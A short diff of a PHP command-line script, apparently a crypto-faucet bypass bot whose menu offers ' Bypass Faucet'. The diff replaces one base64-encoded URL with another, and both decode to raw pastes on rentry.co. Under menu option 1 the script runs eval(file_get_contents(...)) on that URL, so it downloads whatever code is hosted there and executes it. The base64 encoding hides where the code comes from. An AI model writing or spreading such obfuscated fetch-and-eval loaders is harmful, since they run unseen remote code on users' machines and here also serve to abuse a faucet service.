@@ -375,6 +375,6 @@ self::menu(1," Bypass Faucet");
 $menu=readline(self::col(strtoupper("pilih:"),"mp") );self::g();
 switch ($menu) {
 case 1:
-eval(file_get_contents(base64_decode("aHR0cHM6Ly9yZW50cnkuY28vcGFyc2luZ2t1L3Jhdw==")));
+eval(file_get_contents(base64_decode("aHR0cHM6Ly9yZW50cnkuY28vbmV3MTIzMjIvcmF3")));
 
-Di
+
